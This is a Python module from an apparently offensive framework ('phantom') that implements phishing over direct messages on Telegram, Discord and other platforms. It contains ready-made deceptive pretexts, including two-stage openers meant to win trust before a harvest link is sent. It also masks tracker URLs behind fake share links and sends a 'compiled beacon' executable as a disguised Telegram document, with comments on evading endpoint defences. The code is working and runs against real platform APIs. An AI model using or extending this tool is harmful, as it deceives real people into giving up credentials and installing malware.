"""
social_dm.py — direct-message (DM) delivery engine for the social chain.

Phishing over private messages (Telegram, Discord, X/Reddit DMs) converts
better than cold email and reaches people whose mail gateway blocks HTML.
This module delivers short, pretext-driven DMs with a tracking / harvest
link — the same grabbit links the email chain uses, so a click still turns
into a VICTIM_IP and the network chain takes over.

Design (mirrors the rest of the social package):

  * Transports are injectable. The default `get_dm_transport()` picks a
    real free channel from the environment (Telegram bot API first, then a
    Discord webhook) and degrades to a clear ERROR marker when neither is
    configured — the agent never hangs.
  * Every network call goes through the transport's `send()` so tests swap
    in a deterministic fake and nothing ever leaves the machine in CI.
  * Output uses stable marker lines the shared social interpreter parses:

        DM_SENT: to=<handle> platform=<p> link=<url>

  * DMs are deliberately short (message-app length) and carry one link.

Platform reality check (documented honestly):
  Telegram and Discord have free, key-only APIs — those are the default
  transports. X/Instagram/Reddit DMs require OAuth app credentials or a
  logged-in browser session, so they are NOT faked here: subclass
  DMTransport with your own auth (or a Playwright session) and set
  PHANTOM_DM_TRANSPORT to a dotted path to load it.
"""

from __future__ import annotations

import json
import os
import time
import urllib.request
import uuid
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# DM pretexts (short — message-app length)
# ---------------------------------------------------------------------------

_DM_PRESTEXTS: Dict[str, Dict[str, str]] = {
    "security_verify": {
        "label": "Security verify",
        "text": "Hi {name}, we noticed a new login to your {platform} "
                "account. Confirm it was you: {link}",
    },
    "recruiter": {
        "label": "Recruiter",
        "text": "Hi {name}, I came across your profile and you look like a "
                "strong fit for a role we're hiring for. Quick intro: {link}",
    },
    "collab": {
        "label": "Collab request",
        "text": "Hey {name}, we're putting together a project and wanted to "
                "see if you're open to it: {link}",
    },
    "prize": {
        "label": "Giveaway",
        "text": "Congrats {name}, your {platform} account was selected in "
                "our giveaway. Claim it here: {link}",
    },
    "invoice": {
        "label": "Invoice",
        "text": "Hi {name}, your latest invoice is ready for review: {link}",
    },
}


# ---------------------------------------------------------------------------
# innocuous cold openers (attachment-first / two-stage)
# ---------------------------------------------------------------------------
# The reality the legacy pretexts above get wrong: "verify your account",
# "your invoice", "you won a prize" are exactly the angles people have
# learned not to click, and the ones chat/mail filters punish hardest. The
# cold opener that converts asks for NOTHING and concerns THE TARGET:
#
#     a file with their name on it, a mention of them, "is this you?"
#
# Each entry carries two stages, because the reliable cold delivery has no
# link in the first message at all:
#
#   stage 1  no link — it opens the conversation (and the attachment path
#            carries the file here instead of a URL)
#   stage 2  the link, sent AFTER the target replied: by then the sender is
#            "someone I am talking to" and a link is unremarkable
#
# No brand, no alarm, no request. That is the whole point.

_INNOCUOUS_PRESTEXTS: Dict[str, Dict[str, str]] = {
    "wrong_recipient": {
        "label": "Wrong recipient",
        "stage1": "hey, sorry — I think I sent you a file by mistake, it "
                  "wasn't meant for you. is it yours by any chance?",
        "stage2": "thanks, that's the one — here it is, tell me if it's "
                  "the right file: {link}",
        "category": "innocuous",
    },
    "found_file": {
        "label": "Found file",
        "stage1": "hi — I found a file with your name on it, I think it "
                  "might be yours",
        "stage2": "here, have a look: {link}",
        "category": "innocuous",
    },
    "is_this_you": {
        "label": "Is this you?",
        "stage1": "hey, is this you? I found it in a group chat",
        "stage2": "here, take a look: {link}",
        "category": "innocuous",
    },
    "mentioned_doc": {
        "label": "You were mentioned",
        "stage1": "hey, you were mentioned in this document",
        "stage2": "sending it over: {link}",
        "category": "innocuous",
    },
}

for _pid, _rec in _INNOCUOUS_PRESTEXTS.items():
    # `text` keeps the single-body callers (and the legacy renderer) working
    _rec.setdefault("text", _rec["stage2"])
    _DM_PRESTEXTS[_pid] = _rec

# the legacy pretexts stay available but are TAGGED: the agent leads with an
# innocuous opener and only falls back to a flagged one when asked
for _pid, _rec in _DM_PRESTEXTS.items():
    _rec.setdefault("category", "flagged")
del _pid, _rec


def dm_pretext_category(pretext_id: str) -> str:
    """"innocuous" (asks for nothing, concerns the target) or "flagged"
    (the security / prize / invoice angles people no longer click)."""
    return str((_DM_PRESTEXTS.get(pretext_id) or {}).get("category",
                                                          "flagged"))


def innocuous_dm_pretexts() -> List[str]:
    """The cold openers that carry no alarm and no brand."""
    return [p for p, r in _DM_PRESTEXTS.items()
            if r.get("category") == "innocuous"]


def recommended_dm_pretext(seed: int = 0) -> str:
    """The opener to lead with. Deterministic (seed-stable) so a resumed
    run keeps the same story, and always innocuous: the opener's job is a
    REPLY, not a click."""
    ids = innocuous_dm_pretexts()
    if not ids:
        return "security_verify"
    return ids[seed % len(ids)]


def render_dm_message(pretext_id: str, context: Dict[str, str],
                      link: str = "", stage: int = 1) -> Optional[str]:
    """Render a STAGED DM body. Unknown id -> None.

    stage 1 = the opener (no link on the innocuous pretexts); stage 2 =
    the follow-up that carries the link. Legacy (flagged) pretexts declare
    no stages, so both stages render their single body and existing
    callers keep their behaviour.
    """
    tpl = _DM_PRESTEXTS.get(pretext_id)
    if tpl is None:
        return None
    ctx = {k: (v or "") for k, v in context.items()}
    ctx.setdefault("name", "there")
    ctx.setdefault("platform", "online")
    ctx.setdefault("link", link or "https://example.com")
    body = (tpl.get("stage2") or tpl["text"]) if stage == 2 \
        else (tpl.get("stage1") or tpl["text"])
    return body.format(**ctx)


# ---------------------------------------------------------------------------
# channel capability matrix — WHO can carry WHAT
# ---------------------------------------------------------------------------
# The single source of truth the agent reads to pick a delivery strategy.
# Encoded per platform, because "send a link" and "send a file" are not
# interchangeable and the honest answer differs by channel:
#
#   files="yes"              the platform AND our transport carry a document
#   files="transport-needed" the platform carries documents but phantom has
#                            no free transport for it (WhatsApp: Meta Cloud
#                            API or a logged-in session)
#   files="no"               no file transfer at all (Instagram, TikTok, X)
#
# `strategy` is the decided default; `strategy_why` is the reason, so the
# reasoning log can SHOW the decision instead of asserting it.

CHANNEL_CAPABILITIES: Dict[str, Dict[str, Any]] = {
    "telegram": {
        "files": "yes", "masked_link": True, "strategy": "attachment",
        "strategy_why": "Bot API carries any document with no extension "
                        "blocklist; a file in the chat leaves no URL to "
                        "judge",
        "needs": "",
    },
    "discord": {
        "files": "transport-needed", "masked_link": True,
        "strategy": "attachment",
        "strategy_why": "the webhook API carries documents and markdown "
                        "links render text, not the raw URL — but our "
                        "discord transport does not implement the "
                        "attachment path yet",
        "needs": "a Discord attachment path (multipart sendDocument)",
    },
    "console": {
        "files": "yes", "masked_link": True, "strategy": "attachment",
        "strategy_why": "dry-run: prints what the real channel would carry",
        "needs": "",
    },
    "whatsapp": {
        "files": "transport-needed", "masked_link": False,
        "strategy": "attachment",
        "strategy_why": "WhatsApp carries documents but has no free "
                        "official API — the artefact is the right payload, "
                        "the transport is the missing piece",
        "needs": "a WhatsApp transport (Meta Cloud API or a logged-in "
                 "session)",
    },
    "instagram": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "no file transfer and the raw URL is always "
                        "shown: the opener must earn a reply first, the "
                        "link rides the second message",
        "needs": "",
    },
    "tiktok": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "no file transfer and the raw URL is always shown",
        "needs": "",
    },
    "x": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "no file transfer; the platform rewrites links, "
                        "so the opener still earns the reply",
        "needs": "",
    },
    "facebook": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "no file transfer for a stranger's message",
        "needs": "",
    },
    "reddit": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "no file transfer; DMs are heavily filtered",
        "needs": "",
    },
    "email": {
        "files": "yes", "masked_link": True, "strategy": "attachment",
        "strategy_why": "an attachment is scanned but the recipient's own "
                        "viewer opens it — there is no link to judge",
        "needs": "",
    },
    "sms": {
        "files": "no", "masked_link": False, "strategy": "two_stage",
        "strategy_why": "text only; the link is the whole message",
        "needs": "",
    },
}


def plan_delivery(platform: str = "auto", strategy: str = "auto",
                  attachment_kind: str = "html") -> Dict[str, Any]:
    """Decide HOW to deliver on this platform — and say why.

    Returns {platform, strategy, carries_file, file_support, masked_link,
    why, needs, attachment_kind}. `strategy` is one of:

        attachment   the artefact (no URL) goes in the chat
        two_stage    opener with no link, then the link after a reply
        masked_link  link now, text rendered by the client (Telegram/Discord)
        link         link now, raw URL visible

    An unknown platform gets the conservative two_stage plan: guessing
    "this channel takes files" and being wrong wastes the contact.
    """
    p = (platform or "auto").strip().lower() or "auto"
    cap = CHANNEL_CAPABILITIES.get(p)
    if cap is None:
        cap = {
            "files": "no", "masked_link": False, "strategy": "two_stage",
            "strategy_why": f"unknown platform '{p}': assume no file "
                            "transfer and no masked links",
            "needs": "",
        }
    strat = (strategy or "auto").strip().lower()
    if strat == "auto":
        strat = str(cap.get("strategy") or "two_stage")
    if strat == "attachment" and cap.get("files") == "no":
        # the platform truly cannot carry a file: the strategy degrades to
        # two_stage. "transport-needed" keeps `attachment` as the plan (that
        # IS the right strategy) with carries_file=0 + the missing piece in
        # `needs` — never claim the file went where it did not
        strat = "two_stage"
    return {
        "platform": p,
        "strategy": strat,
        "carries_file": cap.get("files") == "yes",
        "file_support": cap.get("files"),
        "masked_link": bool(cap.get("masked_link")),
        "why": cap.get("strategy_why", ""),
        "needs": cap.get("needs", ""),
        "attachment_kind": (attachment_kind or "html").lower(),
    }


def dm_plan_marker(plan: Dict[str, Any], handle: str = "") -> str:
    """One machine-readable line the social interpreter / log renders."""
    return (f"DM_PLAN: platform={plan.get('platform', '')} "
            f"strategy={plan.get('strategy', '')} "
            f"carries_file={1 if plan.get('carries_file') else 0} "
            f"masked={1 if plan.get('masked_link') else 0} "
            f"kind={plan.get('attachment_kind', '')} "
            + (f"to={handle} " if handle else "")
            + f"needs={plan.get('needs') or 'none'}")


def launch_dm_attachment(targets: List[str], path: str, caption: str = "",
                         filename: str = "",
                         transport: Optional[DMTransport] = None
                         ) -> Tuple[bool, List[str]]:
    """Deliver the capture ARTEFACT (no link) and report the plan.

    Honest wrapper over `launch_dm_file`: same transport capability check,
    plus the `DM_PLAN` line so the reasoning log shows the strategy even on
    a channel that cannot carry the file.
    """
    lines: List[str] = []
    if transport is None:
        transport = get_dm_transport()
    plat = getattr(transport, "platform", "") or "unknown"
    lines.append(dm_plan_marker(plan_delivery(plat),
                                targets[0] if targets else ""))
    ok, out = launch_dm_file(targets, path, caption=caption,
                             filename=filename, transport=transport)
    return ok, lines + out


def dm_pretext_ids() -> List[str]:
    return list(_DM_PRESTEXTS.keys())


def render_dm_pretext(pretext_id: str, context: Dict[str, str],
                      link: str = "") -> Optional[str]:
    """Render a short DM body. Unknown id -> None; placeholders degrade to
    neutral defaults so no `None` or `{...}` ever reaches the wire."""
    tpl = _DM_PRESTEXTS.get(pretext_id)
    if tpl is None:
        return None
    ctx = {k: (v or "") for k, v in context.items()}
    ctx.setdefault("name", "there")
    ctx.setdefault("platform", "online")
    ctx.setdefault("link", link or "https://example.com")
    return tpl["text"].format(**ctx)


# ---------------------------------------------------------------------------
# transports (injectable)
# ---------------------------------------------------------------------------

class DMTransport:
    """Base class for a DM channel. send() returns True on delivery.

    `supports_masked_link`: the channel renders link TEXT instead of
    showing the raw URL (Telegram HTML mode, Discord markdown). Where it
    is supported the DM can show a plausible share link while the actual
    target stays the tracker — the only way to hide an operator domain in
    a chat, since the platform otherwise renders the real URL.
    """

    platform = "generic"
    supports_masked_link = False
    # Only the channels whose platform policy allows a REAL binary attachment
    # set this. Telegram does (the Bot API has no extension blocklist);
    # WhatsApp sanitises executables, Discord blocks them, and Instagram /
    # TikTok have no file transfer at all — so on those the honest answer is
    # a link, never a file.
    supports_files = False

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        raise NotImplementedError

    def send_document(self, target: str, path: str, caption: str = "",
                      filename: str = "", timeout: float = 90.0) -> bool:
        """Attach a local file to the chat. False when the channel has no
        file path — the caller must not pretend it was delivered."""
        return False


def mask_link(text: str, link: str, display: str,
              kind: str = "html") -> str:
    """Replace the raw tracking URL in `text` with a masked link whose
    VISIBLE text is `display` (a plausible platform share URL).

    kind="html"      -> <a href="link">display</a>   (Telegram HTML mode)
    kind="markdown"  -> [display](link)              (Discord masked link)
    Returns the text unchanged when display/link is empty.
    """
    if not link or not display:
        return text
    if kind == "markdown":
        return text.replace(link, f"[{display}]({link})")
    return text.replace(link, f'<a href="{link}">{display}</a>')


class TelegramDMTransport(DMTransport):
    """Telegram Bot API — free, key-only. `target` is a chat id or @username.

    Supports masked links: with parse_mode=HTML a message can show a
    plausible share URL as text while the href is the tracker."""

    platform = "telegram"
    supports_masked_link = True
    supports_files = True

    def __init__(self, token: str = "") -> None:
        from phantom.utils import config as cfg
        self.token = (token or str(cfg.get(
            "transports.telegram_bot_token", "",
            env="PHANTOM_TELEGRAM_BOT_TOKEN")).strip())

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        if not self.token:
            return False
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        body: Dict[str, Any] = {"chat_id": target, "text": text}
        if "<a href=" in text:
            body["parse_mode"] = "HTML"
        payload = json.dumps(body).encode()
        req = urllib.request.Request(url, data=payload,
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                data = json.loads(resp.read().decode("utf-8", "ignore"))
            return bool(data.get("ok"))
        except Exception:
            return False


    def send_document(self, target: str, path: str, caption: str = "",
                      filename: str = "", timeout: float = 90.0) -> bool:
        """Attach a FILE to the chat (Bot API `sendDocument`).

        This is the one social channel that carries the compiled beacon: the
        Bot API enforces **no extension blocklist**, so a PE / ELF / APK goes
        through as an ordinary document. Nothing here inspects the content —
        the Content-Type is `application/octet-stream` and the platform does
        not care what is inside.

        What that does NOT buy you is execution: the moment the recipient
        saves the file, Windows tags it (Mark-of-the-Web) and SmartScreen /
        Defender / the AV do their job on the host. That is the gate the
        beacon's evasion exists for — the DM is passable, the endpoint is the
        fight.

        `filename` overrides the name the recipient sees. Keep it plausible:
        the name is the only thing they see before the file is saved.
        """
        if not self.token or not path or not os.path.isfile(path):
            return False
        name = filename or os.path.basename(path)
        try:
            with open(path, "rb") as fh:
                data = fh.read()
        except OSError:
            return False
        boundary = "----PhantomBoundary" + uuid.uuid4().hex
        parts: List[bytes] = []

        def _field(field_name: str, value: str) -> None:
            parts.append(
                (f"--{boundary}\r\nContent-Disposition: form-data; "
                 f'name="{field_name}"\r\n\r\n{value}\r\n').encode())

        _field("chat_id", target)
        if caption:
            _field("caption", caption)
        parts.append(
            (f"--{boundary}\r\nContent-Disposition: form-data; "
             f'name="document"; filename="{name}"\r\n'
             f"Content-Type: application/octet-stream\r\n\r\n").encode()
            + data + b"\r\n")
        parts.append(f"--{boundary}--\r\n".encode())
        body = b"".join(parts)
        url = f"https://api.telegram.org/bot{self.token}/sendDocument"
        req = urllib.request.Request(
            url, data=body,
            headers={"Content-Type":
                     f"multipart/form-data; boundary={boundary}"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                out = json.loads(resp.read().decode("utf-8", "ignore"))
            return bool(out.get("ok"))
        except Exception:
            return False


class DiscordDMTransport(DMTransport):
    """Discord webhook — free, key-only. `target` is the webhook channel id
    or username label (delivery goes to the webhook's channel).

    Supports masked links: markdown `[text](url)` renders the text only."""

    platform = "discord"
    supports_masked_link = True

    def __init__(self, webhook: str = "") -> None:
        from phantom.utils import config as cfg
        self.webhook = (webhook or str(cfg.get(
            "transports.discord_webhook", "",
            env="PHANTOM_DISCORD_WEBHOOK")).strip())

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        if not self.webhook:
            return False
        payload = json.dumps({"content": text}).encode()
        req = urllib.request.Request(self.webhook, data=payload,
                                     headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status == 204
        except Exception:
            return False


class FakeDMTransport(DMTransport):
    """Deterministic in-memory transport for tests / dry-run."""

    platform = "fake"
    sent: List[Tuple[str, str]] = []

    def __init__(self) -> None:
        self.sent = []

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        self.sent.append((target, text))
        return True


class ConsoleDMTransport(DMTransport):
    """Prints the DM to the terminal instead of sending (dry-run).

    Models a file-capable channel so a dry-run shows the SAME strategy the
    real channel would use (the attachment path, not a link)."""

    platform = "console"
    supports_files = True

    def send(self, target: str, text: str, timeout: float = 15.0) -> bool:
        from rich.console import Console
        # ASCII only: the arrow glyph breaks cp1252 Windows consoles
        Console().print(f"[dim][DM -> {target}] {text}[/]")
        return True

    def send_document(self, target: str, path: str, caption: str = "",
                      filename: str = "", timeout: float = 90.0) -> bool:
        from rich.console import Console
        name = filename or os.path.basename(path)
        Console().print(f"[dim][DM FILE -> {target}] {name} ({path})[/]")
        if caption:
            Console().print(f"[dim][caption] {caption}[/]")
        return True


def get_dm_transport(platform: str = "auto") -> Optional[DMTransport]:
    """Resolve the transport from env config.

    * platform="auto" (default): Telegram token first, then Discord webhook.
    * platform="telegram" / "discord": explicit channel (returns None when
      its credential is missing).
    * platform="console": dry-run to stdout (never sends).
    * PHANTOM_DM_TRANSPORT=<dotted.path.to.Class>: load a custom transport
      (e.g. a Playwright-based X/Instagram DM adapter) from the operator's
      own code. Falls back to auto when it cannot be loaded.
    """
    from phantom.utils import config as cfg
    custom = str(cfg.get("transports.dm_transport", "",
                         env="PHANTOM_DM_TRANSPORT")).strip()
    if custom and platform == "auto":
        try:
            mod_path, _, cls_name = custom.rpartition(".")
            import importlib
            mod = importlib.import_module(mod_path)
            cls = getattr(mod, cls_name)
            return cls()
        except Exception:
            pass  # fall through to built-ins

    if platform == "console":
        return ConsoleDMTransport()
    if platform == "telegram":
        t = TelegramDMTransport()
        return t if t.token else None
    if platform == "discord":
        d = DiscordDMTransport()
        return d if d.webhook else None
    # auto
    t = TelegramDMTransport()
    if t.token:
        return t
    d = DiscordDMTransport()
    if d.webhook:
        return d
    return None


# ---------------------------------------------------------------------------
# high-level launcher
# ---------------------------------------------------------------------------

def launch_dm(targets: List[str], pretext: str = "security_verify",
              link: str = "", transport: Optional[DMTransport] = None,
              context: Optional[Dict[str, str]] = None,
              display: str = "", stage: int = 1) -> Tuple[bool, List[str]]:
    """Send one short DM per target. Returns (ok, marker lines).

    `link` is the per-target tracking/harvest URL. When `transport` is None
    the env-resolved transport is used; if none is configured the call
    degrades to a single ERROR marker (never hangs).

    `display` is the VISIBLE text used in place of the raw URL when the
    channel supports masked links (Telegram HTML / Discord markdown): the
    target reads a plausible platform share link while the destination
    stays the tracker. Unsupported channels keep the raw URL — the domain
    is genuinely visible there, and pretending otherwise would be a lie.
    """
    lines: List[str] = []
    if not targets:
        return False, ["ERROR: dm requires at least one target"]
    if pretext not in dm_pretext_ids():
        return False, [
            f"ERROR: unknown_dm_pretext_{pretext}: use one of "
            f"{','.join(dm_pretext_ids())}"]
    if transport is None:
        transport = get_dm_transport()
    if transport is None:
        return False, ["ERROR: no_dm_transport_configured: "
                       "set PHANTOM_TELEGRAM_BOT_TOKEN or PHANTOM_DISCORD_WEBHOOK"]
    ctx = {k: (v or "") for k, v in (context or {}).items()}
    ok_any = False
    for t in targets:
        t = (t or "").strip()
        if not t:
            continue
        # STAGED body: stage 1 is the opener (no link on the innocuous
        # pretexts), stage 2 is the follow-up that carries the link. Legacy
        # pretexts render the same body on both stages, so nothing changes
        # for callers that never learned about stages.
        text = render_dm_message(pretext, ctx, link=link or "", stage=stage)
        if not text:
            continue
        masked = False
        if display and link and getattr(transport, "supports_masked_link", False):
            kind = "markdown" if transport.platform == "discord" else "html"
            text = mask_link(text, link, display, kind=kind)
            masked = True
        delivered = transport.send(t, text)
        if delivered:
            ok_any = True
        lines.append(
            f"DM_SENT: to={t} platform={transport.platform} "
            f"link={link or ''} delivered={1 if delivered else 0} "
            f"masked={1 if masked else 0} stage={stage}")
    if not ok_any:
        return False, lines
    return True, lines


def launch_dm_file(targets: List[str], path: str, caption: str = "",
                   filename: str = "",
                   transport: Optional[DMTransport] = None
                   ) -> Tuple[bool, List[str]]:
    """Attach a FILE (the compiled beacon) to a DM.

    This is the delivery path that needs no link click: the file lands in
    the chat and the target saves it. Honest scope:

      * Telegram works today — no extension blocklist, files up to 50 MB via
        the Bot API. A bot can only message a chat that already started it,
        so this is warm/known-contact delivery, not a cold opener;
      * WhatsApp / Discord reject executables, Instagram / TikTok carry no
        files at all: on those the file path returns False and the caller
        must fall back to the link.

    Marker: `DM_FILE: to=<t> platform=<p> name=<n> delivered=<0|1>`.
    """
    lines: List[str] = []
    if not targets:
        return False, ["ERROR: dm_file requires at least one target"]
    if not path or not os.path.isfile(path):
        return False, ["ERROR: dm_file requires an existing artifact path"]
    if transport is None:
        transport = get_dm_transport()
    if transport is None:
        return False, ["ERROR: no_dm_transport_configured: "
                       "set PHANTOM_TELEGRAM_BOT_TOKEN"]
    name = filename or os.path.basename(path)
    ok_any = False
    for t in targets:
        t = (t or "").strip()
        if not t:
            continue
        delivered = False
        if getattr(transport, "supports_files", False):
            delivered = transport.send_document(t, path, caption=caption,
                                                filename=name)
        if delivered:
            ok_any = True
        lines.append(
            f"DM_FILE: to={t} platform={transport.platform} name={name} "
            f"delivered={1 if delivered else 0}")
    if not ok_any:
        return False, lines + [
            f"ERROR: file_delivery_unsupported_on_{transport.platform}: "
            f"use the link lure instead"]
    return True, lines


def dm_delivery_report(lines: List[str]) -> Dict[str, Any]:
    """Summarise the delivery markers for campaign reporting.

    Counts BOTH message markers: `DM_SENT` (a text message — an opener or a
    link) and `DM_FILE` (the attachment strategy, where the FILE is the
    message and there is no link at all). A report that only counted text
    would show zero for a channel that delivered the artefact perfectly.
    """
    sent, delivered, files = 0, 0, 0
    platforms: set = set()
    strategies: set = set()
    for line in lines or []:
        if line.startswith("DM_SENT:"):
            marker = "DM_SENT:"
        elif line.startswith("DM_FILE:"):
            marker = "DM_FILE:"
            files += 1
        elif line.startswith("DM_PLAN:"):
            for chunk in line[len("DM_PLAN:"):].split():
                if chunk.startswith("strategy="):
                    strategies.add(chunk.split("=", 1)[1])
            continue
        else:
            continue
        kv = {}
        for chunk in line[len(marker):].split():
            if "=" in chunk:
                k, v = chunk.split("=", 1)
                kv[k] = v
        sent += 1
        if kv.get("delivered") == "1":
            delivered += 1
        if kv.get("platform"):
            platforms.add(kv["platform"])
    return {"sent": sent, "delivered": delivered, "files": files,
            "platforms": sorted(platforms), "strategies": sorted(strategies)}
